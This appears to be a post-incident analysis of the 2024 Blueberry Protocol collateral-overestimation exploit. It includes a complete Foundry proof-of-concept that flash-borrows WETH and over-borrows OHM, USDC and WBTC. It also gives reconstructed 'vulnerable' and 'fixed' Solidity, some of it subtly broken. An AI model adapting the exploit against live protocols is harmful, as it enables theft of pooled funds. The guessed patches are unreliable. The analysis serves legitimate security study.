# Blueberry Protocol — Price Dependency Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-02-23 |
| **Protocol** | Blueberry Protocol |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$1,400,000 USD |
| **Attacker** | [0xc0ff...9671](https://etherscan.io/address/0xc0ffeebabe5d496b2dde509f9fa189c25cf29671) (White Hat) |
| **Attack Contract** | [0x3aa2...6809](https://etherscan.io/address/0x3aa228a80f50763045bdfc45012da124bd0a6809) |
| **Attack Tx** | [0xf046...6e4](https://etherscan.io/tx/0xf0464b01d962f714eee9d4392b2494524d0e10ce3eb3723873afd1346b8b06e4) |
| **Vulnerable Contract** | [0xffad...ec2](https://etherscan.io/address/0xffadb0bba4379dfabfb20ca6823f6ec439429ec2) (Comptroller) |
| **Root Cause** | Collateral value overestimation — bToken price dependency vulnerability after enterMarkets and rounding error |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/BlueberryProtocol_exp.sol) |

---

## 1. Vulnerability Overview

Blueberry Protocol is a Leveraged Yield Farming protocol based on a Compound fork. Users can deposit assets as collateral and borrow other assets.

### Core Vulnerability

This attack is a compound attack combining the following two vulnerabilities:

**1. Collateral Value Overestimation (Price Dependency Vulnerability)**
After calling `enterMarkets()`, the collateral value of bWETH tokens obtained via `bWETH.mint()` was calculated far in excess of the actual deposited amount (1 WETH ≈ $2,400). The Comptroller's `getAccountLiquidity()` function contained a rounding error or price calculation bug when combining the bToken's exchangeRate with the oracle price.

**2. Borrow Limit Validation Failure (Logic Error)**
When calling `borrow()`, the borrowable amount relative to collateral was not correctly validated. Using 1 WETH (approximately $2,400) as collateral, the following could be borrowed simultaneously:
- OHM: 8,616,071,267,266 units (approximately $500K worth)
- USDC: 913,262,603,416 units (approximately $913K worth)
- WBTC: 686,690,100 units (approximately 6.86 BTC ≈ $300K worth)

Total borrow value of approximately $1.4M — an abnormal level roughly 583x the collateral.

### Notes on the Attacker

The attacker address `0xc0ffeebabe...` is a known white hat hacker address. Most of the acquired assets were returned, and this attack is understood to have been performed for vulnerability demonstration and emergency protection purposes rather than actual theft.

---

## 2. Vulnerable Code Analysis

### 2.1 Comptroller — Collateral Value Calculation Error After enterMarkets (Core Vulnerability)

Blueberry Protocol's Comptroller is a Compound v2 fork. When calculating collateral value in `getAccountLiquidity()`, the following logic is used:

```solidity
// Vulnerable code (estimated) — Comptroller.sol
function getHypotheticalAccountLiquidityInternal(
    address account,
    BToken bTokenModify,
    uint redeemTokens,
    uint borrowAmount
) internal view returns (Error, uint, uint) {
    
    AccountLiquidityLocalVars memory vars;
    
    // Iterate over each bToken market and sum collateral values
    BToken[] memory assets = accountAssets[account];
    for (uint i = 0; i < assets.length; i++) {
        BToken asset = assets[i];
        
        // ❌ Vulnerability: uses exchangeRateStored()
        // which may be a stale value with interest accrual not yet reflected
        (oErr, vars.bTokenBalance, vars.borrowBalance, vars.exchangeRateMantissa) =
            asset.getAccountSnapshot(account);
        
        vars.collateralFactor = Exp({mantissa: markets[address(asset)].collateralFactorMantissa});
        vars.exchangeRate = Exp({mantissa: vars.exchangeRateMantissa});

        // ❌ Vulnerability: fetches oracle price at current time
        // but combining with bToken's exchangeRate may cause precision loss or
        // rounding direction may work in the attacker's favor
        vars.oraclePriceMantissa = oracle.getUnderlyingPrice(asset);
        
        // Collateral value = bTokenBalance × exchangeRate × oraclePrice × collateralFactor
        // ❌ Precision loss in intermediate calculations overestimates collateral value
        vars.tokensToDenom = mul_(
            mul_(vars.collateralFactor, vars.exchangeRate),
            vars.oraclePriceMantissa
        );
        vars.sumCollateral = mul_ScalarTruncateAddUInt(
            vars.tokensToDenom, vars.bTokenBalance, vars.sumCollateral
        );
    }
    // ...
}
```

```solidity
// Fixed code ✅
function getHypotheticalAccountLiquidityInternal(
    address account,
    BToken bTokenModify,
    uint redeemTokens,
    uint borrowAmount
) internal view returns (Error, uint, uint) {
    
    AccountLiquidityLocalVars memory vars;
    BToken[] memory assets = accountAssets[account];
    
    for (uint i = 0; i < assets.length; i++) {
        BToken asset = assets[i];
        
        // ✅ Fix: call accrueInterest() first to reflect the latest exchangeRate
        asset.accrueInterest();
        
        (oErr, vars.bTokenBalance, vars.borrowBalance, vars.exchangeRateMantissa) =
            asset.getAccountSnapshot(account);
        
        vars.collateralFactor = Exp({mantissa: markets[address(asset)].collateralFactorMantissa});
        vars.exchangeRate = Exp({mantissa: vars.exchangeRateMantissa});

        // ✅ Fix: use TWAP-based oracle and add price validation
        vars.oraclePriceMantissa = oracle.getUnderlyingPrice(asset);
        require(vars.oraclePriceMantissa > 0, "Invalid oracle price");
        
        // ✅ Fix: correct calculation order to prevent precision loss
        // rounding always favors the protocol (floor applied)
        vars.tokensToDenom = mul_(
            mul_(vars.collateralFactor, vars.exchangeRate),
            vars.oraclePriceMantissa
        );
        vars.sumCollateral = mul_ScalarTruncateAddUInt(
            vars.tokensToDenom, vars.bTokenBalance, vars.sumCollateral
        );
    }
    
    // ✅ Added: collateral-to-borrow ratio upper bound validation
    require(
        vars.sumCollateral >= mul_(vars.sumBorrowPlusEffects, Exp({mantissa: MIN_COLLATERAL_RATIO})),
        "Insufficient collateral"
    );
}
```

**Issue**: When the Comptroller calculates the collateral value of a bToken, the `exchangeRateMantissa` returned by `getAccountSnapshot()` may not be up-to-date, and a rounding error occurs during multiplication with the oracle price. As a result, bWETH worth 1 WETH is recognized at a much higher collateral value, allowing excessive borrowing.

### 2.2 bBep20 — Missing borrow() Validation

```solidity
// Vulnerable code (estimated) — BErc20.sol / BBep20.sol
function borrow(uint borrowAmount) external returns (uint) {
    // ❌ Vulnerability: borrowInternal internally calls Comptroller.borrowAllowed()
    // but the Comptroller's collateral value calculation is already incorrect, so validation passes
    return borrowInternal(borrowAmount);
}

function borrowInternal(uint borrowAmount) internal nonReentrant returns (uint) {
    uint error = accrueInterest();
    
    // ❌ Vulnerability: borrowAllowed permits the borrow based on an incorrectly
    // calculated collateral value, effectively nullifying the validation
    uint allowed = comptroller.borrowAllowed(address(this), msg.sender, borrowAmount);
    require(allowed == 0, "borrow not allowed");
    
    BorrowLocalVars memory vars;
    vars.accountBorrows = borrowBalanceStoredInternal(msg.sender);
    vars.totalBorrows = totalBorrows;
    
    // borrow executed — excessive amount can be withdrawn since validation already passed incorrectly
    doTransferOut(msg.sender, borrowAmount);
    
    vars.accountBorrowsNew = vars.accountBorrows + borrowAmount;
    vars.totalBorrowsNew = vars.totalBorrows + borrowAmount;
    
    accountBorrows[msg.sender].principal = vars.accountBorrowsNew;
    totalBorrows = vars.totalBorrowsNew;
    
    return NO_ERROR;
}
```

```solidity
// Fixed code ✅
function borrow(uint borrowAmount) external returns (uint) {
    // ✅ Fix: force latest exchangeRate update before borrowing
    accrueInterest();
    return borrowInternal(borrowAmount);
}

function borrowInternal(uint borrowAmount) internal nonReentrant returns (uint) {
    // ✅ Fix: re-validate collateral ratio after borrow
    uint allowed = comptroller.borrowAllowed(address(this), msg.sender, borrowAmount);
    require(allowed == 0, "borrow not allowed");
    
    // ✅ Added: direct minimum collateral ratio validation
    (, uint shortfall) = comptroller.getAccountLiquidity(msg.sender);
    require(shortfall == 0, "Account undercollateralized — borrow not allowed");
    
    BorrowLocalVars memory vars;
    // ... remainder unchanged
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- The attacker pre-approved OHM to be swapped for WETH on a Uniswap V3 pool
- Prepared a dust amount of ETH (0.000000000000009997 ETH ≈ dust)

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────────────┐
│                    Attacker (0xc0ffeebabe)                        │
│              Block 19,287,289 (2024-02-23)                        │
└─────────────────────┬───────────────────────────────────────────┘
                      │ 1. Dust ETH → WETH conversion (0.00...9997 ETH)
                      │ 2. approveAll() call
                      │    - WETH.approve(bWETH, MAX)
                      │    - OHM.approve(UniV3Router, MAX)
                      ▼
┌─────────────────────────────────────────────────────────────────┐
│                   Balancer Vault                                  │
│              flashLoan(request 1 WETH)                            │
└─────────────────────┬───────────────────────────────────────────┘
                      │ 3. 1 WETH flash loan executed
                      ▼
┌─────────────────────────────────────────────────────────────────┐
│              receiveFlashLoan() callback                          │
│                                                                   │
│  Step A: BlueberryProtocol.enterMarkets([bWETH])                 │
│          → Register bWETH as collateral asset                     │
│                                                                   │
│  Step B: bWETH.mint(1e18)                                        │
│          → Deposit 1 WETH → Receive bWETH tokens                 │
│          ┌──────────────────────────────────────────┐            │
│          │ ❌ Vulnerability: bWETH collateral         │            │
│          │    value overestimated                    │            │
│          │    Actual: ~$2,400 worth                  │            │
│          │    Calculated: ~$1,400,000+               │            │
│          └──────────────────────────────────────────┘            │
│                                                                   │
│  Step C: bOHM.borrow(8_616_071_267_266)                         │
│          → Borrow ~8.6B units of OHM (~$500K)                    │
│          → Comptroller.borrowAllowed() incorrectly passes         │
│                                                                   │
│  Step D: bUSDC.borrow(913_262_603_416)                          │
│          → Borrow ~$913K in USDC                                  │
│          → Collateral validation passes again (bug)               │
│                                                                   │
│  Step E: bWBTC.borrow(686_690_100)                              │
│          → Borrow ~6.86 BTC in WBTC (~$300K)                     │
└─────────────────────┬───────────────────────────────────────────┘
                      │ Step F: OHM → WETH swap (Uniswap V3)
                      │ exactOutputSingle: consume OHM → receive 0.999...WETH
                      ▼
┌─────────────────────────────────────────────────────────────────┐
│                   Balancer Vault                                  │
│              Flash loan repayment (return 1 WETH)                 │
└─────────────────────────────────────────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────────────────┐
│                    Final Result                                    │
│  Attacker holds: USDC ~$913K + WBTC ~6.86 BTC                   │
│  (OHM consumed for WETH repayment)                               │
│  Net profit: ~$1,400,000 (mostly returned as white hat)          │
└─────────────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

| Asset | Amount Borrowed | Estimated Value | Notes |
|------|---------|---------|------|
| OHM | 8,616,071,267,266 | ~$500,000 | Swapped to WETH on Uniswap V3 to repay flash loan |
| USDC | 913,262,603,416 | ~$913,000 | Retained by attacker |
| WBTC | 686,690,100 | ~$300,000 | Retained by attacker (6.86 BTC) |
| **Total Loss** | | **~$1,400,000** | White hat — mostly returned |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// No SPDX License (Foundry test)
// Attack reproduction test: BlueberryProtocol collateral value overestimation exploit

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo
// Total Loss: ~$1,400,000 USD
// Attacker: 0xc0ffeebabe5d496b2dde509f9fa189c25cf29671 (White Hat)
// Attack Contract: 0x3aa228a80f50763045bdfc45012da124bd0a6809
// Vulnerable Contract: 0xffadb0bba4379dfabfb20ca6823f6ec439429ec2
// Attack Tx: 0xf0464b01d962f714eee9d4392b2494524d0e10ce3eb3723873afd1346b8b06e4

interface IMarketFacet {
    // enterMarkets: register array of bToken addresses as collateral assets
    function enterMarkets(address[] calldata vTokens) external returns (uint256[] memory);
}

contract ContractTest is Test {
    // ── Token address setup ──────────────────────────────────────────────
    WETH9 private WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 private OHM  = IERC20(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5);
    IERC20 private USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);

    // ── bToken address setup (Blueberry lending markets) ───────────────────────
    bBep20Interface private bWETH = bBep20Interface(0x643d448CEa0D3616F0b32E3718F563b164e7eDd2);
    bBep20Interface private bOHM  = bBep20Interface(0x08830038A6097C10f4A814274d5A68E64648d91c);
    bBep20Interface private bUSDC = bBep20Interface(0x649127D0800a8c68290129F091564aD2F1D62De1);
    bBep20Interface private bWBTC = bBep20Interface(0xE61ad5B0E40c856E6C193120Bd3fa28A432911B6);

    // ── Protocol contracts ────────────────────────────────────────────
    IMarketFacet BlueberryProtocol = IMarketFacet(0xfFadB0bbA4379dFAbFB20CA6823F6EC439429ec2);
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    Uni_Router_V3 pool = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    function setUp() public {
        // Fork to just before the attack block (block 19,287,288)
        vm.createSelectFork("mainnet", 19_287_289 - 1);
    }

    function testAttack() public {
        // [Step 1] Convert dust ETH to WETH (to cover flash loan repayment shortfall)
        vm.deal(address(this), 0.000000000000009997 ether);
        WETH.deposit{value: 0.000000000000009997 ether}();

        // [Step 2] Set up pre-approvals
        WETH.approve(address(bWETH), type(uint256).max);  // Approve WETH → bWETH mint
        OHM.approve(address(pool), type(uint256).max);    // Approve OHM → WETH swap

        // [Step 3] Borrow 1 WETH via Balancer flash loan
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1_000_000_000_000_000_000; // 1 WETH

        // Trigger receiveFlashLoan callback
        balancer.flashLoan(address(this), tokens, amounts, new bytes(1));
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        // [Step 4A] Register bWETH as collateral asset
        address[] memory tokenList = new address[](1);
        tokenList[0] = address(bWETH);
        BlueberryProtocol.enterMarkets(tokenList);

        // [Step 4B] Deposit 1 WETH into bWETH market → receive bWETH
        // ❌ Collateral value overestimation bug triggers at this point
        bWETH.mint(1_000_000_000_000_000_000);

        // [Step 4C~E] Execute excessive borrows by exploiting collateral value bug
        bOHM.borrow(8_616_071_267_266);    // Borrow OHM (~$500K)
        bUSDC.borrow(913_262_603_416);     // Borrow USDC (~$913K)
        bWBTC.borrow(686_690_100);         // Borrow WBTC (~$300K)

        // [Step 4F] Swap portion of borrowed OHM to WETH (prepare for flash loan repayment)
        Uni_Router_V3.ExactOutputSingleParams memory params = Uni_Router_V3.ExactOutputSingleParams({
            tokenIn: address(OHM),
            tokenOut: address(WETH),
            fee: 3000,                              // 0.3% pool
            recipient: address(this),
            deadline: type(uint256).max,
            amountOut: 999_999_999_999_999_999,     // Receive exactly 1 WETH - 1 wei
            amountInMaximum: type(uint256).max,     // No limit on OHM consumed
            sqrtPriceLimitX96: 0
        });
        pool.exactOutputSingle(params);

        // [Step 5] Repay flash loan (dust WETH + swapped WETH = 1 WETH)
        WETH.transfer(address(balancer), 1_000_000_000_000_000_000);
        // USDC and WBTC retained by attacker
    }

    receive() external payable {}
    fallback() external payable {}
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | Collateral Value Overestimation (Price Dependency) | CRITICAL | CWE-682 | `04_oracle_manipulation.md`, `18_liquidation.md` |
| V-02 | bToken Rounding/Precision Error | CRITICAL | CWE-682 | `05_integer_issues.md` |
| V-03 | Borrow Limit Validation Logic Error | HIGH | CWE-20 | `11_logic_error.md`, `18_liquidation.md` |

### V-01: Collateral Value Overestimation (Price Dependency Vulnerability)

- **Description**: When the Comptroller calculates the collateral value of a bToken inside `getAccountLiquidity()` or `borrowAllowed()`, an abnormally high collateral value is produced during the process of combining the bToken's exchangeRate with the oracle price. bWETH worth 1 WETH was recognized as having approximately 583x the collateral value.
- **Impact**: The attacker was able to deposit just 1 WETH and borrow $1.4M worth of assets. Assets across the protocol's entire liquidity pool are exposed to risk.
- **Attack Conditions**: Immediately exploitable via market participation (enterMarkets) + small WETH deposit (mint) + sequential borrow calls on each bToken market.

### V-02: bToken Rounding/Precision Error

- **Description**: A precision loss issue common in Compound forks, where `mul_ScalarTruncate` functions apply rounding in a direction unfavorable to the protocol (favorable to the attacker). In particular, when `exchangeRateMantissa` holds an abnormal value, collateral value can inflate dramatically.
- **Impact**: Large-scale borrowing possible with a small deposit — risk of draining the protocol's entire liquidity.
- **Attack Conditions**: Particularly effective when the attacker is the first depositor or at market initialization. Can also trigger under specific exchangeRate conditions in normal operation.

### V-03: Borrow Limit Validation Logic Error

- **Description**: Since `borrowAllowed()` performs validation using an overestimated collateral value as input, it fails to detect an actually undercollateralized state. The fact that sequential borrow() calls for OHM, USDC, and WBTC all passed also suggests that cumulative borrow amount validation was not functioning properly.
- **Impact**: Borrows are permitted even in an undercollateralized state, causing the protocol to accumulate bad debt.
- **Attack Conditions**: V-01 or V-02 vulnerability is a prerequisite.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// 1. Force latest interest accrual before borrowing
// BErc20.sol — modify borrowInternal
function borrowInternal(uint borrowAmount) internal nonReentrant returns (uint) {
    // ✅ Update interest for all collateral markets first
    BToken[] memory assets = comptroller.getAssetsIn(msg.sender);
    for (uint i = 0; i < assets.length; i++) {
        assets[i].accrueInterest();
    }
    
    uint allowed = comptroller.borrowAllowed(address(this), msg.sender, borrowAmount);
    require(allowed == 0, "borrow not allowed");
    
    // ✅ Re-validate final collateral ratio after borrow (double check)
    (, uint shortfall) = comptroller.getAccountLiquidity(msg.sender);
    require(shortfall == 0, "Insufficient collateral");
    
    // ... remainder of execution
}
```

```solidity
// 2. Apply safe rounding when calculating collateral value
// Comptroller.sol — always round collateral value down (floor)
function collateralValueOf(
    address account,
    BToken bToken
) internal view returns (uint) {
    // ✅ bToken balance
    uint bTokenBalance = bToken.balanceOf(account);
    if (bTokenBalance == 0) return 0;
    
    // ✅ exchangeRate: always use latest value
    uint exchangeRate = bToken.exchangeRateCurrent(); // use current instead of stored
    
    // ✅ Oracle price validation
    uint oraclePrice = oracle.getUnderlyingPrice(bToken);
    require(oraclePrice > 0 && oraclePrice < type(uint128).max, "Abnormal oracle price");
    
    uint collateralFactor = markets[address(bToken)].collateralFactorMantissa;
    
    // ✅ Always calculate collateral value with floor rounding
    return bTokenBalance
        .mul(exchangeRate).div(1e18)   // underlying amount
        .mul(oraclePrice).div(1e18)    // USD value
        .mul(collateralFactor).div(1e18); // apply collateral factor
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Collateral value overestimation | Enforce use of `exchangeRateCurrent()` (prohibit stored), introduce TWAP oracle |
| Rounding error | Always apply floor rounding for collateral value, ceiling rounding for borrowable amount |
| Cumulative borrow limit validation | Real-time re-validation of cumulative borrow amount on consecutive borrow calls |
| Market initialization protection | Require minimum initial liquidity to prevent first-depositor attacks |
| Price manipulation defense | Use Chainlink TWAP combined with circuit breakers |
| Emergency pause mechanism | Auto-detect and pause on abnormal borrow patterns (e.g., single address borrowing >10% of pooled liquidity) |

---

## 7. Lessons Learned

1. **Independent security audits are essential when forking Compound**: Even when forking the Compound v2 codebase, new vulnerabilities can be introduced during asset addition, parameter changes, and additional feature implementation. In particular, collateral value calculation logic must be precisely verified.

2. **Use `exchangeRateCurrent()` instead of `exchangeRateStored()`**: Using a stale cached value allows attackers to exploit moments when an abnormal value is applied by timing their attack carefully. Calculations for borrow eligibility must always force-refresh to the latest value.

3. **Consistency in rounding direction**: In DeFi protocols, rounding must always favor the protocol (floor for collateral, ceiling for debt). If rounding works in the attacker's favor, small deposits can be used to repeatedly extract large profits.

4. **Apply a double-validation pattern**: In addition to the `borrowAllowed()` call, a double-check that re-validates the account's final collateral ratio immediately after executing `borrow()` is necessary. A single validation point becomes a single point of failure.

5. **Importance of white hat programs**: In this incident, a known white hat hacker discovered the vulnerability and notified the operations team after a minimal PoC execution, minimizing losses. Active bug bounty programs and white hat ecosystem support meaningfully contribute to preventing real losses.

6. **Real-time anomaly detection systems are necessary**: A pattern of borrowing $1.4M immediately after depositing 1 WETH is fully detectable via on-chain monitoring. If an automated circuit breaker had triggered on the abnormal collateral ratio deviation, the incident could have been contained early.

---

## 8. On-Chain Verification

### 8.1 Transaction Basic Information

| Field | Value |
|------|-----|
| Block Number | 19,287,289 |
| From (Attacker) | 0xc0ffeebabe5d496b2dde509f9fa189c25cf29671 |
| To (Attack Contract) | 0x3AA228a80F50763045BDfc45012dA124Bd0a6809 |
| Transaction Status | Success |

### 8.2 PoC vs On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual Value | Match |
|------|--------|-------------|---------|
| Balancer flash loan | 1 WETH | 1 WETH | ✅ Match |
| bWETH mint amount | 1e18 (1 WETH) | 1e18 (1 WETH) | ✅ Match |
| OHM borrow | 8,616,071,267,266 | 8,616,071,267,266 | ✅ Match |
| USDC borrow | 913,262,603,416 | 913,262,603,416 | ✅ Match |
| WBTC borrow | 686,690,100 | 686,690,100 | ✅ Match |
| Flash loan repayment | 1 WETH | 1 WETH | ✅ Match |

### 8.3 Key On-Chain Event Sequence

```
[1] WETH.Transfer: Attacker → Balancer Vault (1 WETH, flash loan request)
[2] WETH.Transfer: Balancer Vault → Attack Contract (1 WETH transferred)
[3] MarketEntered: bWETH market entry event
[4] WETH.Transfer: Attack Contract → bWETH Contract (1 WETH, mint)
[5] bWETH.Transfer: 0x0 → Attack Contract (bWETH minted)
[6] OHM.Transfer: bOHM → Attack Contract (OHM borrowed)
[7] USDC.Transfer: bUSDC → Attack Contract (USDC borrowed)
[8] WBTC.Transfer: bWBTC → Attack Contract (WBTC borrowed)
[9] OHM.Transfer: Attack Contract → UniV3 Pool (OHM → WETH swap)
[10] WETH.Transfer: UniV3 Pool → Attack Contract (WETH received)
[11] WETH.Transfer: Attack Contract → Balancer Vault (1 WETH, repayment)
```

### 8.4 On-Chain Verification Conclusion

All steps of the PoC code match the actual on-chain data. The key to the attack's success was the ability to borrow OHM, USDC, and WBTC consecutively in steps 6–8, which was the result of the Comptroller's collateral value calculation error allowing `borrowAllowed()` validation to pass.

---

*Published: 2026-04-11 | Analysis based on: DeFiHackLabs PoC (BlueberryProtocol_exp.sol)*